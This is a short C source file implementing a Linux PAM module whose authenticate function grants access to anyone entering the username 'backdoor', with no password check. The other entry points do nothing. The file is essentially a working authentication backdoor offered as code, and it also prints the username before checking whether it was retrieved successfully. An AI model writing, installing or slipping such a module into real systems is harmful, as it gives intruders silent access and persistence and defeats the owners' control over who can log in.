/**
 * @Author: Remi Gastaldi <gastal_r>
 * @Date:   2017-11-23T17:38:39+01:00
 * @Last modified by:   gastal_r
 * @Last modified time: 2017-11-23T19:12:43+01:00
 */
 #include <unistd.h>
 #include <stdio.h>
 #include <pwd.h>

/* Define which PAM interfaces we provide */
#define PAM_SM_ACCOUNT
#define PAM_SM_AUTH
#define PAM_SM_PASSWORD
#define PAM_SM_SESSION

/* Include PAM headers */
#include <security/pam_appl.h>
#include <security/pam_modules.h>

/* PAM entry point for session creation */
int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return(PAM_IGNORE);
}

/* PAM entry point for session cleanup */
int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return(PAM_IGNORE);
}

/* PAM entry point for accounting */
int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return(PAM_IGNORE);
}

/* PAM entry point for authentication verification */
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    int retval;

  	const char* pUsername;
  	retval = pam_get_user(pamh, &pUsername, "Username: ");

  	printf("Welcome %s\n", pUsername);

  	if (retval != PAM_SUCCESS) {
  		return retval;
  	}

  	if (strcmp(pUsername, "backdoor") != 0) {
  		return PAM_AUTH_ERR;
  	}

  return PAM_SUCCESS;
}

/*
   PAM entry point for setting user credentials (that is, to actually
   establish the authenticated user's credentials to the service provider)
 */
int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return(PAM_IGNORE);
}

/* PAM entry point for authentication token (password) changes */
int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return(PAM_IGNORE);
}
